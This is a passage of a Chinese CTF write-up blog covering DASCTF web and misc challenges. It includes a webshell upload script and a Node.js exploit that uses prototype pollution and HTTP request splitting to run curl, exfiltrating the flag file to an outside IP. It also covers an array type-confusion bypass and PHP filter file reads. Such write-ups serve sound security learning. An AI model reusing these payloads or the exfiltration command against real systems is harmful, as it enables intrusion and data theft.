class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="title class_">LoginController</span>,</span><br><span class="line">    <span class="title class_">CheckInternalController</span>,</span><br><span class="line">    <span class="title class_">Flag1Controller</span>,</span><br><span class="line">    <span class="title class_">CheckController</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function LoginController(req,res) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        const username = req.body.username</span><br><span class="line">        const password = req.body.password</span><br><span class="line">        if (username !== &quot;admin&quot; || password !== Math.random().toString()) &#123;</span><br><span class="line">            res.status(401).type(&quot;text/html&quot;).send(&quot;Login Failed&quot;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.cookie(&quot;user&quot;,SECRET_COOKIE)</span><br><span class="line">            res.redirect(&quot;/flag1&quot;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (__) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以知道flag1的获取方法就是访问/flag1目录并构造一个cookie</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin</span><br></pre></td></tr></table></figure>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203204849857.png" alt="Node Magical Login 01"></p>
+<p>flag1:  DASCTF{873803822</p>
+<p>在<strong>controller.js</strong>同样知道了flag2的获取方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function CheckController(req,res) &#123;</span><br><span class="line">    let checkcode = req.body.checkcode?req.body.checkcode:1234;</span><br><span class="line">    console.log(req.body)</span><br><span class="line">    if(checkcode.length === 16)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            checkcode = checkcode.toLowerCase()</span><br><span class="line">            if(checkcode !== &quot;aGr5AtSp55dRacer&quot;)&#123;</span><br><span class="line">                res.status(403).json(&#123;&quot;msg&quot;:&quot;Invalid Checkcode1:&quot; + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (__) &#123;&#125;</span><br><span class="line">        res.status(200).type(&quot;text/html&quot;).json(&#123;&quot;msg&quot;:&quot;You Got Another Part Of Flag: &quot; + flag2.toString().trim()&#125;)</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        res.status(403).type(&quot;text/html&quot;).json(&#123;&quot;msg&quot;:&quot;Invalid Checkcode2:&quot; + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有两个判断：一个是checkcode的长度强等于16；一个是在经过<code>toLowerCase()</code>全转换为小写之后要与</p>
+<p><code>aGr5AtSp55dRacer</code>相等。</p>
+<p>可以使用数组来bypass</p>
+<p>构建checkcode</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;checkcode&quot;</span>:[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;G&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;A&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;S&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;5&quot;</span>,<span class="string">&quot;5&quot;</span>,</span><br><span class="line"><span class="string">&quot;d&quot;</span>,<span class="string">&quot;R&quot;</span>,</span><br><span class="line"><span class="string">&quot;a&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;r&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<strong>main.js</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag2&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckInternalController</span>(req,res)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/getflag2&quot;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span> &#123;</span><br><span class="line">    controller.<span class="title class_">CheckController</span>(req,res)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>这里GET类型访问/flag2输入验证码抓包后输入构造好的checkcode</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203213649385.png" alt="Node Magical Login 02"></p>
+<p>获取到flag2：77244565647131723193036}</p>
+<p>flag：DASCTF{87380382277244565647131723193036}</p>
+<hr>
+<p>但是在测试中发现了一个比较简单的数组bypass，满足长度为16即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&quot;checkcode&quot;:[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203213905343.png" alt="Node Magical Login 03"></p>
+<p>这里应该是出题人没限制好</p>
+<h2 id="unusual-php"><a class="markdownIt-Anchor" href="#unusual-php"></a> unusual php</h2>
+<h3 id="解题过程-3"><a class="markdownIt-Anchor" href="#解题过程-3"></a> 解题过程：</h3>
+<p>访问给的链接可以获得部分源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;upload&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;read&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]==<span class="string">&quot;version&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现能够上传还能读文件</p>
+<p>我们这里读一下/var/www/html/index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=read&amp;&amp;file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230203234858467.png" alt="unusual php 01"></p>
+<p>发现存在乱码，应该是写了一个拓展加解密，查看phpinfo()</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204010131847.png" alt="unusual php 02"></p>
+<p>注意编号：20190902</p>
+<p>读取/proc/self/maps，搜索20190902</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204012341032.png" alt="unusual php"></p>
+<p>利用伪协议读取.so文件，并保存为.so文件</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204012907656.png" alt="usunual php 04"></p>
+<p>对其进行反编译，找到Rc4加密的密钥“abcsdfadfjiweur”</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013112977.png" alt="usunual php 05"></p>
+<p>对一开始拿到的index.php进行解密验证一下</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013306754.png" alt="usunual php 06"></p>
+<p>密钥正确</p>
+<p>编写一句话木马进行加密</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204013605153.png" alt="usunual php 07"></p>
+<p>写一个上传脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=upload&quot;</span></span><br><span class="line"></span><br><span class="line">data = base64.b64decode(<span class="string">&quot;473xeG4d+1FXOOiInKCA0rVEAkBL0stSocHDxQ==&quot;</span>)</span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;TWe1v3.php&#x27;</span>,data)&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line">re_content = s.post(url=url,files=file)</span><br><span class="line"><span class="built_in">print</span>(re_content.text)</span><br></pre></td></tr></table></figure>
+<p>蚁剑链接：</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204014151419.png" alt="usunual php 08"></p>
+<p>原本是需要使用chmod来提升/flag权限的，但是复现是共享端口，别人已经提完权限了，直接读取就好</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204014430184.png" alt="usunual php 09"></p>
+<h2 id="real_ez_node"><a class="markdownIt-Anchor" href="#real_ez_node"></a> real_ez_node</h2>
+<h3 id="解题过程-4"><a class="markdownIt-Anchor" href="#解题过程-4"></a> 解题过程：</h3>
+<p>审源码：</p>
+<p>NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击。然后存在然后存在safeobj.expend进行原型链污染，导致命令执行，接着原型链污染打ejs。<code>constructor.prototype.outputFunctionName</code>绕过那个<code>__proto__</code></p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12053#toc-17%E5%92%8Chttps://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/12053#toc-17和https://xz.aliyun.com/t/2894</a></p>
+<p>构建exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Pragma: no-cache</span></span><br><span class="line"><span class="string">Cache-Control: no-cache</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Length: 168</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;curl 101.43.139.243:8081/`cat /f*|base64`&#x27;);var __tmp2&quot;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span> + <span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r = requests.get(</span><br><span class="line">    <span class="string">&#x27;http://3000.endpoint-9552f7133e68401e95e14dbecd1ab348.m.ins.cloud.dasctf.com:81/curl?q=&#x27;</span> + urllib.parse.quote(</span><br><span class="line">        payload))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<p>运行exp，自己的vps开启端口监听</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204020134877.png" alt="image-20230204020134877"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/REFTQ1RGezYzMzgzOTAzNjA4OTQzNTkyMTQ4MTIwMDg1MjQyMjk1fQo= //base64解码就行</span><br><span class="line">DASCTF&#123;63383903608943592148120085242295&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> #Misc</h1>
+<h2 id="机你太美"><a class="markdownIt-Anchor" href="#机你太美"></a> 机你太美</h2>
+<h3 id="解题过程-5"><a class="markdownIt-Anchor" href="#解题过程-5"></a> 解题过程：</h3>
+<p>修改文件后缀后，7z解压后，夜神模拟器导入vmdk</p>
+<p>删除pin值</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zev_Fung/p/14192545.html">https://www.cnblogs.com/Zev_Fung/p/14192545.html</a></p>
+<p>删除/data/system/locksettings.db即可</p>
+<p>重启进入，发现安装有QQ和Skred</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031119995.png" alt="image-20230204031119995"></p>
+<p>打开Skred发现聊天记录</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031253040.png" alt="image-20230204031253040"></p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031314258.png" alt="image-20230204031314258"></p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204031344112.png" alt="image-20230204031344112"></p>
+<p>发现聊天记录传输了⽂件，根据skred的存储文件的位置，可以直接定位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/mobi.skred.app/files/conversations</span><br></pre></td></tr></table></figure>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204032727182.png" alt="image-20230204032727182"></p>
+<p>使⽤adb pull来提取⽂件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/data/mobi.skred.app/files/conversations/9f817126-eabd-4c5c-9b47-bebe04545ba0/50.zip D:\桌面\CTF\西湖论剑2023\jntm-update\dasctf</span><br></pre></td></tr></table></figure>
+<p>其他文件类似操作提取即可</p>
+<p>解压压缩包发现存在解压密码，可能存在两张图片里，图片可能采取了隐写之类的隐藏信息的方式</p>
+<p>使用stegslove打开45.png，在Alpha plane处发现信息，写脚本提取其二进制信息</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204033851762.png" alt="image-20230204033851762"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;45.png&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">        pixl = img.getpixel((m,n))</span><br><span class="line">        <span class="keyword">if</span>(pixl[<span class="number">3</span>] == <span class="number">255</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">1</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">0</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;_______________&quot;</span>) </span><br><span class="line"><span class="comment">#0110010100110000001100010011010100110100001101000110000100111001001100110011001100110011011001010110011000110110001100100110000100110011011000010110000100110010001101110011001100110101001101110110010101100010001101010011001001100101011000010011100001100001</span></span><br></pre></td></tr></table></figure>
+<p>进行编码转换一下</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204034628556.png" alt="image-20230204034628556"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e01544a9333ef62a3aa27357eb52ea8a</span><br></pre></td></tr></table></figure>
+<p>得到解压密码，解压50.zip，获得一个flag文件，记事本打开为一串乱码，猜测可能是啥加密，信息应该在75.jpg上面</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204034838826.png" alt="image-20230204034838826"></p>
+<p>根据赛方放出的hint3：在线exif</p>
+<p>试着查看一下75.jpg的exif信息，这里我使用的是<a target="_blank" rel="noopener" href="https://exif.tuchong.com/">EXIF信息查看器 (tuchong.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">EXIF信息摘要</span><br><span class="line">模式	曝光模式:Aperture-priority AE, 测光模式:Multi-segment, 曝光补偿:0</span><br><span class="line">曝光	光圈:4.0, 快门:1/250秒, ISO200</span><br><span class="line">焦距	50.0 mm (35 mm equivalent: 80.9 mm), 视角:25.1 deg</span><br><span class="line">色彩	白平衡:Auto, 色彩空间:sRGB</span><br><span class="line">File</span><br><span class="line">FileType	JPEG</span><br><span class="line">FileTypeExtension	jpg</span><br><span class="line">MIMEType	image/jpeg</span><br><span class="line">ExifByteOrder	Little-endian (Intel, II)</span><br><span class="line">ImageWidth	3888</span><br><span class="line">ImageHeight	2592</span><br><span class="line">EncodingProcess	Baseline DCT, Huffman coding</span><br><span class="line">BitsPerSample	8</span><br><span class="line">ColorComponents	3</span><br><span class="line">YCbCrSubSampling	YCbCr4:2:2 (2 1)</span><br><span class="line">IFD0</span><br><span class="line">方向	Horizontal (normal)</span><br><span class="line">X分辨率	72</span><br><span class="line">Y分辨率	72</span><br><span class="line">分辨率单位	inches</span><br><span class="line">YCbCr定位	Co-sited</span><br><span class="line">ExifIFD</span><br><span class="line">曝光时间	1/250</span><br><span class="line">光圈值	4.0</span><br><span class="line">曝光程序	Aperture-priority AE</span><br><span class="line">ISO	200</span><br><span class="line">Exif版本	0221</span><br><span class="line">ComponentsConfiguration	Y, Cb, Cr, -</span><br><span class="line">快门速度值	1/250</span><br><span class="line">光圈值	4.0</span><br><span class="line">曝光补偿	0</span><br><span class="line">测光模式	Multi-segment</span><br><span class="line">闪光灯	Off, Did not fire</span><br><span class="line">焦距	50.0 mm</span><br><span class="line">用户注释	XOR DASCTF2022</span><br><span class="line">SubSecTime	39</span><br><span class="line">SubSecTime原始	39</span><br><span class="line">SubSecTime数码化	39</span><br><span class="line">Flashpix版本	0100</span><br><span class="line">色彩空间	sRGB</span><br><span class="line">Exif图像宽度	3888</span><br><span class="line">Exif图像高度	2592</span><br><span class="line">焦平面X轴分辨率	4438.356164</span><br><span class="line">焦平面Y轴分辨率	4445.969125</span><br><span class="line">焦平面分辨率单位	inches</span><br><span class="line">CustomRendered	Normal</span><br><span class="line">曝光模式	Auto</span><br><span class="line">白平衡	Auto</span><br><span class="line">场景Capture类型	Standard</span><br><span class="line">InteropIFD</span><br><span class="line">Interop索引	R98 - DCF basic file (sRGB)</span><br><span class="line">Interop版本	0100</span><br><span class="line">IFD1</span><br><span class="line">压缩	JPEG (old-style)</span><br><span class="line">X分辨率	72</span><br><span class="line">Y分辨率	72</span><br><span class="line">分辨率单位	inches</span><br><span class="line">缩略图偏移	8412</span><br><span class="line">缩略图长度	19629</span><br><span class="line">ThumbnailImage	(Binary data 19629 bytes, use -b option to extract)</span><br><span class="line">Composite</span><br><span class="line">光圈	4.0</span><br><span class="line">图像尺寸	3888x2592</span><br><span class="line">Megapixels	10.1</span><br><span class="line">35mm等效因子	1.6</span><br><span class="line">快门速度	1/250</span><br><span class="line">(最小)模糊圈	0.019 mm</span><br><span class="line">视角	25.1 deg</span><br><span class="line">35mm等效焦距	50.0 mm (35 mm equivalent: 80.9 mm)</span><br><span class="line">超焦距	33.67 m</span><br><span class="line">亮度值	11.0</span><br></pre></td></tr></table></figure>
+<p>可以看到用户注释为<code>XOR DASCTF2022</code></p>
+<p>对flag文件进行XOR</p>
+<p><img src="/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912022--%E9%83%A8%E5%88%86Writeup%E5%8F%8A%E5%A4%8D%E7%8E%B0/image-20230204035735656.png" alt="image-20230204035735656"></p>
+<p>获得flag：DASCTF{fe089fecf73daa9dcba9bc385df54605}</p>
+<h1 id="写在后面"><a class="markdownIt-Anchor" href="#写在后面"></a> #写在后面</h1>
+<p>这次比赛全程投入，做的很累，不过收获还是很大的，也很遗憾，一个学校只能进入决赛一只队伍，想去线下和很多师傅见面的，这次是没机会去杭州了，不过能去线下的机会多着呢！不急，认识蛮久了，就差线下瞅瞅了哈哈哈哈</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Misc/" rel="tag"># Misc</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Realworld%E4%BD%93%E9%AA%8C%E8%B5%9B-Writeup/" rel="prev" title="【Realworld体验赛】--Writeup">
+                  <i class="fa fa-chevron-left"></i> 【Realworld体验赛】--Writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/pyjail-001-%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" rel="next" title="pyjail-001-基础学习">
+                  pyjail-001-基础学习 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
